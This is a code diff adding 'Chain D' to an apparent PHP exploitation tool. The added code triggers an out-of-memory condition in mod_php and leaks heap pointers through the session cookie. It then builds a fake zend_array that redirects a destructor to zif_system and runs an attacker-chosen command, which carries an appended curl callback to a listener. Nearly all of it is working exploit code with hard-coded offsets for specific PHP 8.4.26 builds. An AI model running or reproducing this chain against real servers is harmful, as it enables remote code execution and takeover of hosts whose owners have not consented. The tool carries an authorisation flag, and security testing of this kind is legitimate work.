@@ -737,6 +737,408 @@ def _try_log_poison_rce(
     return result
 
 
+# ---------------------------------------------------------------------------
+# Chain D: pure OOM mod_php exploit (no LFI required)
+# ---------------------------------------------------------------------------
+
+# Offset profiles: per PHP build + arch.
+# Keys: zval_ptr_dtor (offset in libphp.so), zif_system (offset in libphp.so),
+#        fake_array_S (offset in main chunk), hsv (heap slot vector in main chunk).
+CHAIN_D_PROFILES: Dict[str, Dict[str, int]] = {
+    "8.4.26-apache-trixie-x86_64": {
+        "zval_ptr_dtor": 0x34FA10,
+        "zif_system": 0x388600,
+        "fake_array_S": 0xF8398,
+        "hsv": 0x7D720,
+    },
+    "8.4.26-apache-trixie-aarch64": {
+        "zval_ptr_dtor": 0x2D2270,
+        "zif_system": 0x2FC138,
+        "fake_array_S": 0xF8398,
+        "hsv": 0x7D720,
+    },
+}
+
+
+def _parse_heap_leak(raw_cookie: bytes) -> Optional[Dict[str, Any]]:
+    """Parse leaked heap data from a PHPSESSID Set-Cookie.
+
+    After OOM + dangling PS(id), the session cookie contains raw heap bytes.
+    We scan for pointers in the 0x7f... range (x86_64) or use alignment heuristics.
+
+    Returns dict with 'libphp_base', 'main_chunk_base', 'zval_ptr_dtor_addr',
+    or None if parsing fails.
+    """
+    if len(raw_cookie) < 64:
+        return None
+
+    ptrs: List[int] = []
+    for off in range(0, len(raw_cookie) - 7, 8):
+        val = int.from_bytes(raw_cookie[off:off + 8], "little")
+        if 0x7f0000000000 <= val <= 0x7fffffffffff:
+            ptrs.append(val)
+
+    if len(ptrs) < 5:
+        return None
+
+    # Cluster by 2 MiB aligned base (libphp .text alignment)
+    from collections import Counter
+    bases_2m = Counter(p & ~0x1FFFFF for p in ptrs)
+    if not bases_2m:
+        return None
+
+    # Most common 2MiB base is likely zval_ptr_dtor cluster (appears ~150+ times)
+    most_common = bases_2m.most_common(5)
+    zval_ptr_dtor_base = most_common[0][0]
+
+    # The actual zval_ptr_dtor address: most frequently occurring pointer
+    ptr_counts = Counter(ptrs)
+    zval_ptr_dtor_addr = ptr_counts.most_common(1)[0][0]
+
+    # Main chunk base: scan for large-page-aligned addresses (~0x200000-aligned)
+    # that appear ~87 times (consistent with zend_mm_heap layout)
+    chunk_candidates = []
+    for base, count in bases_2m.items():
+        if base != zval_ptr_dtor_base and 70 <= count <= 120:
+            chunk_candidates.append((base, count))
+
+    main_chunk_base = None
+    if chunk_candidates:
+        chunk_candidates.sort(key=lambda x: abs(x[1] - 87))
+        main_chunk_base = chunk_candidates[0][0]
+
+    return {
+        "zval_ptr_dtor_addr": zval_ptr_dtor_addr,
+        "libphp_base": zval_ptr_dtor_addr & ~0x1FFFFF,
+        "main_chunk_base": main_chunk_base,
+        "pointer_count": len(ptrs),
+        "unique_bases": len(bases_2m),
+    }
+
+
+def _build_chain_d_payload(
+    command: str,
+    profile_offsets: Dict[str, int],
+    libphp_base: int,
+    main_chunk_base: int,
+) -> bytes:
+    """Build the B2 payload: fake zend_array + refcount spray that
+    redirects pDestructor → zif_system with our command string.
+    """
+    import struct
+
+    zif_system = libphp_base + profile_offsets["zif_system"]
+    fake_array_off = profile_offsets["fake_array_S"]
+    hsv_off = profile_offsets["hsv"]
+
+    fake_array_addr = main_chunk_base + fake_array_off
+    hsv_addr = main_chunk_base + hsv_off
+
+    # Build fake zend_array (HashTable) structure:
+    # - gc.refcount=2, gc.u.type_info = IS_ARRAY (7) | collectable flag
+    # - nTableMask = -2  (one bucket)
+    # - arData → points to a fake Bucket we place after
+    # - nNumUsed = 1, nNumOfElements = 1
+    # - nTableSize = 2
+    # - pDestructor → zif_system
+    cmd_bytes = command.encode("utf-8") + b"\x00"
+
+    ht = bytearray(56)
+    # gc: refcount=2, type=7 (IS_ARRAY), flags with GC_COLLECTABLE
+    struct.pack_into("<I", ht, 0, 2)           # refcount
+    struct.pack_into("<I", ht, 4, 0x10 | 7)    # type_info: IS_ARRAY | collectable
+    # nTableMask
+    struct.pack_into("<I", ht, 8, 0xFFFFFFFE)  # -2 as uint32
+    # arData pointer (we place the Bucket right after the HashTable)
+    fake_bucket_addr = fake_array_addr + 56
+    struct.pack_into("<Q", ht, 16, fake_bucket_addr)
+    # nNumUsed, nNumOfElements
+    struct.pack_into("<I", ht, 24, 1)
+    struct.pack_into("<I", ht, 28, 1)
+    # nTableSize
+    struct.pack_into("<I", ht, 32, 2)
+    # nInternalPointer
+    struct.pack_into("<I", ht, 36, 0)
+    # nNextFreeElement
+    struct.pack_into("<q", ht, 40, 1)
+    # pDestructor → zif_system
+    struct.pack_into("<Q", ht, 48, zif_system)
+
+    # Fake Bucket: val is a zval with type=IS_STRING, value points to our command
+    bucket = bytearray(32)
+    cmd_str_addr = fake_bucket_addr + 32
+    struct.pack_into("<Q", bucket, 0, cmd_str_addr)  # zval.value.str
+    struct.pack_into("<I", bucket, 8, 6)              # type = IS_STRING
+    struct.pack_into("<I", bucket, 12, 0)             # type_flags
+    struct.pack_into("<Q", bucket, 16, 0)             # h (hash)
+    struct.pack_into("<Q", bucket, 24, 0)             # key = NULL (numeric)
+
+    # Fake zend_string for the command
+    zstr = bytearray(24 + len(cmd_bytes))
+    struct.pack_into("<I", zstr, 0, 1)                # gc.refcount
+    struct.pack_into("<I", zstr, 4, 6)                # type_info: IS_STRING
+    struct.pack_into("<Q", zstr, 8, hash(command) & 0xFFFFFFFFFFFFFFFF)  # h
+    struct.pack_into("<Q", zstr, 16, len(cmd_bytes) - 1)  # len (without NUL)
+    zstr[24:24 + len(cmd_bytes)] = cmd_bytes
+
+    return bytes(ht) + bytes(bucket) + bytes(zstr)
+
+
+def _try_chain_d_rce(
+    client: HttpClient,
+    profile: TargetProfile,
+    store: RunStore,
+    command: str,
+    listener: Optional[Any],
+    canary_nonce: str,
+    timeout: float = 30.0,
+    workers: int = 5,
+) -> Dict[str, Any]:
+    """Try Chain D: pure OOM exploitation on mod_php (no LFI needed).
+
+    Flow: A1 (OOM) → B1 (heap leak) → A2 (cheap OOM) → B2 (RCE payload).
+    """
+    from .discover import (
+        build_oom_probe_body, build_oom_lite_body,
+        hold_workers, release_workers, _body_text,
+        DiscoverBudget, _safe_get,
+    )
+    from .classifier import classify
+
+    result: Dict[str, Any] = {
+        "success": False, "output": None, "callback_received": False,
+        "notes": [], "request_refs": [], "leak_info": None,
+    }
+
+    parsed_url = urlsplit(profile.base_url)
+    host = parsed_url.hostname or "127.0.0.1"
+    port = parsed_url.port or 80
+    boundary = "C" * 10
+
+    # --- Detect offset profile ---
+    php_version = getattr(profile, "php_version", None)
+    arch = "x86_64"  # default; could detect from phpinfo
+    profile_key = None
+    offsets = None
+    for key, offs in CHAIN_D_PROFILES.items():
+        if php_version and php_version in key:
+            profile_key = key
+            offsets = offs
+            break
+
+    if not offsets:
+        for key, offs in CHAIN_D_PROFILES.items():
+            if "x86_64" in key:
+                profile_key = key
+                offsets = offs
+                break
+
+    if not offsets:
+        result["notes"].append("no matching offset profile found")
+        return result
+
+    result["notes"].append(f"using offset profile: {profile_key}")
+
+    # --- Pin workers ---
+    holders: List[socket.socket] = []
+    try:
+        holders = hold_workers(host, port, workers, timeout=10.0)
+        if len(holders) < max(1, workers - 2):
+            result["notes"].append(f"only pinned {len(holders)}/{workers - 1} workers")
+    except Exception as e:
+        result["notes"].append(f"worker pinning failed: {e}")
+
+    try:
+        # --- A1: trigger OOM to get dangling PS(id) ---
+        result["notes"].append("A1: sending OOM trigger")
+        a1_body = build_oom_probe_body()
+        headers = {
+            "Content-Type": f"multipart/form-data; boundary={boundary}",
+            "Cookie": "PHPSESSID=AAAA",
+        }
+        try:
+            a1_exchange = client.request(
+                "POST", profile.base_url,
+                body=a1_body, headers=headers,
+                chunked=True, nonce=new_nonce("P2SDA1"), timeout=timeout,
+            )
+            a1_class = classify(a1_exchange, nonce="")
+            a1_item = store.add_http(
+                a1_exchange, a1_class,
+                scenario_id="chain-d-a1-oom",
+                trust="medium",
+                notes="Chain D A1: OOM trigger to create dangling session",
+            )
+            result["request_refs"].append(a1_item.id)
+            if a1_exchange.status not in (500, 502):
+                result["notes"].append(f"A1 unexpected status: {a1_exchange.status}")
+        except Exception as e:
+            result["notes"].append(f"A1 failed: {e}")
+            return result
+
+        # --- B1: read back heap leak via PHPSESSID cookie ---
+        result["notes"].append("B1: reading heap leak")
+        b1_headers = {
+            "Cookie": "PHPSESSID=AAAA",
+        }
+        try:
+            b1_exchange = client.request(
+                "GET", profile.base_url,
+                headers=b1_headers,
+                nonce=new_nonce("P2SDB1"), timeout=timeout,
+            )
+            b1_class = classify(b1_exchange, nonce="")
+            b1_item = store.add_http(
+                b1_exchange, b1_class,
+                scenario_id="chain-d-b1-leak",
+                trust="medium",
+                notes="Chain D B1: heap leak via PHPSESSID",
+            )
+            result["request_refs"].append(b1_item.id)
+        except Exception as e:
+            result["notes"].append(f"B1 failed: {e}")
+            return result
+
+        # Extract PHPSESSID from Set-Cookie
+        set_cookie = ""
+        hdrs = b1_exchange.response_headers or {}
+        for hdr_name, hdr_val in (hdrs.items() if isinstance(hdrs, dict) else hdrs):
+            if hdr_name.lower() == "set-cookie" and "PHPSESSID=" in hdr_val:
+                set_cookie = hdr_val
+                break
+
+        if not set_cookie:
+            result["notes"].append("B1: no PHPSESSID in Set-Cookie — leak failed")
+            return result
+
+        # Parse the raw session ID (contains leaked heap bytes)
+        import urllib.parse
+        cookie_parts = set_cookie.split(";")[0]  # PHPSESSID=<data>
+        if "=" in cookie_parts:
+            raw_session = cookie_parts.split("=", 1)[1]
+        else:
+            result["notes"].append("B1: malformed Set-Cookie")
+            return result
+
+        # URL-decode to get raw bytes
+        try:
+            leaked_bytes = urllib.parse.unquote_to_bytes(raw_session)
+        except Exception:
+            leaked_bytes = raw_session.encode("latin-1")
+
+        result["notes"].append(f"B1: got {len(leaked_bytes)} bytes from session cookie")
+
+        if len(leaked_bytes) < 100:
+            result["notes"].append("B1: leak too small — OOM may not have triggered dangling state")
+            return result
+
+        leak = _parse_heap_leak(leaked_bytes)
+        if not leak:
+            result["notes"].append("B1: failed to parse heap layout from leak")
+            return result
+
+        result["leak_info"] = leak
+        result["notes"].append(
+            f"B1: libphp base=0x{leak['libphp_base']:x}, "
+            f"ptrs={leak['pointer_count']}, bases={leak['unique_bases']}"
+        )
+
+        if leak["main_chunk_base"] is None:
+            result["notes"].append("B1: could not determine main chunk base")
+            return result
+
+        result["notes"].append(f"B1: main chunk base=0x{leak['main_chunk_base']:x}")
+
+        # --- A2: cheap OOM to prepare heap for payload ---
+        result["notes"].append("A2: cheap OOM to prepare heap layout")
+        a2_body = build_oom_lite_body(parts=100, depth=16)
+        a2_headers = {
+            "Content-Type": f"multipart/form-data; boundary={boundary}",
+            "Cookie": f"PHPSESSID={raw_session}",
+        }
+        try:
+            a2_exchange = client.request(
+                "POST", profile.base_url,
+                body=a2_body, headers=a2_headers,
+                chunked=True, nonce=new_nonce("P2SDA2"), timeout=timeout,
+            )
+            a2_class = classify(a2_exchange, nonce="")
+            a2_item = store.add_http(
+                a2_exchange, a2_class,
+                scenario_id="chain-d-a2-prep",
+                trust="medium",
+                notes="Chain D A2: cheap OOM to shape heap",
+            )
+            result["request_refs"].append(a2_item.id)
+        except Exception as e:
+            result["notes"].append(f"A2 failed: {e}")
+            return result
+
+        # --- B2: send payload with fake zend_array → zif_system ---
+        if listener:
+            callback_url = listener.callback_url(canary_nonce)
+            full_cmd = f"{command}; curl -s {callback_url} >/dev/null 2>&1"
+        else:
+            full_cmd = command
+
+        result["notes"].append(f"B2: sending RCE payload (cmd: {command})")
+        payload = _build_chain_d_payload(
+            full_cmd, offsets, leak["libphp_base"], leak["main_chunk_base"],
+        )
+
+        # The B2 payload goes as multipart with the fake array placed at
+        # the predicted heap offset via session upload progress
+        b2_boundary = "B" * 10
+        b2_body = bytearray()
+        b2_body.extend(f"--{b2_boundary}\r\n".encode())
+        b2_body.extend(b"Content-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n")
+        b2_body.extend(payload)
+        b2_body.extend(b"\r\n")
+        b2_body.extend(f"--{b2_boundary}--\r\n".encode())
+
+        b2_headers = {
+            "Content-Type": f"multipart/form-data; boundary={b2_boundary}",
+            "Cookie": f"PHPSESSID={raw_session}",
+        }
+        try:
+            b2_exchange = client.request(
+                "POST", profile.base_url,
+                body=bytes(b2_body), headers=b2_headers,
+                chunked=True, nonce=new_nonce("P2SDB2"), timeout=timeout,
+            )
+            b2_class = classify(b2_exchange, nonce="")
+            b2_item = store.add_http(
+                b2_exchange, b2_class,
+                scenario_id="chain-d-b2-rce",
+                trust="medium",
+                notes="Chain D B2: RCE payload via fake zend_array",
+            )
+            result["request_refs"].append(b2_item.id)
+        except Exception as e:
+            result["notes"].append(f"B2 failed: {e}")
+            return result
+
+        body_text = _body_text(b2_exchange)
+
+        # Check for command output or callback
+        if listener:
+            cb = listener.wait_for_callback(canary_nonce, timeout=8.0)
+            if cb:
+                result["callback_received"] = True
+                result["success"] = True
+                result["notes"].append("callback confirmed RCE via Chain D")
+
+        if body_text:
+            result["output"] = body_text[:2000]
+            if not result["success"] and body_text.strip():
+                result["notes"].append("B2 produced output (unverified without callback)")
+
+    finally:
+        release_workers(holders)
+
+    return result
+
+
 def _run_auto(args: argparse.Namespace) -> int:
     if not args.ack_authorised:
         _abort(
@@ -828,7 +1230,13 @@ def _run_auto(args: argparse.Namespace) -> int:
         if discover_result.phpinfo.upload_progress_enabled is False:
             print("    ! session.upload_progress.enabled=Off — session injection will not work")
 
-    # Wrapper RCE comes first (simplest), then log poisoning, then standard chains
+    # Chain D detection
+    chain_d_ready = (discover_result and getattr(discover_result, "chain_d_ready", False))
+    if chain_d_ready:
+        print("\n    ! OOM + mod_php detected — Chain D (pure OOM RCE) available")
+
+    # Wrapper RCE comes first (simplest), then log poisoning, then standard chains,
+    # then Chain D (OOM-only, no LFI), then gadget chain B
     if wrapper_mode and discover_result:
         chains_to_try.append("WRAPPER")
     if log_poison_path and discover_result:
@@ -837,6 +1245,8 @@ def _run_auto(args: argparse.Namespace) -> int:
         chains_to_try.append("A")
         if args.callback_port is not None:
             chains_to_try.append("C")
+    if chain_d_ready:
+        chains_to_try.append("D")
     if args.gadget:
         chains_to_try.append("B")
 
@@ -958,6 +1368,39 @@ def _run_auto(args: argparse.Namespace) -> int:
                     print(f"    [UNVERIFIED OUTPUT] via log poisoning")
                 else:
                     print(f"    log poisoning: {lr['notes'][-1] if lr['notes'] else 'failed'}")
+            continue
+
+        # --- Chain D: pure OOM mod_php (no LFI needed) ---
+        if chain == "D" and chain_d_ready:
+            canary = new_nonce("P2SAUTO")
+            dr = _try_chain_d_rce(
+                client, profile, store,
+                args.command, listener, canary, args.timeout,
+            )
+            chain_entry = {
+                "chain": "D",
+                "rce_confirmed": dr["success"],
+                "callback_received": dr["callback_received"],
+                "response_markers_seen": dr.get("output") is not None,
+                "errors": [],
+                "notes": dr["notes"],
+                "leak_info": dr.get("leak_info"),
+            }
+            chain_results.append(chain_entry)
+            if dr["success"]:
+                rce_confirmed = True
+                print(f"    [RCE CONFIRMED] Chain D: pure OOM exploitation")
+                if dr["output"]:
+                    for line in dr["output"].strip().splitlines()[:10]:
+                        print(f"      | {line}")
+            elif dr["output"]:
+                print(f"    [UNVERIFIED OUTPUT] Chain D")
+                for line in dr["output"].strip().splitlines()[:5]:
+                    print(f"      | {line}")
+            else:
+                print(f"    Chain D: {dr['notes'][-1] if dr['notes'] else 'failed'}")
+                for note in dr["notes"]:
+                    print(f"      . {note}")
             continue
 
         # --- Standard chains A/B/C ---
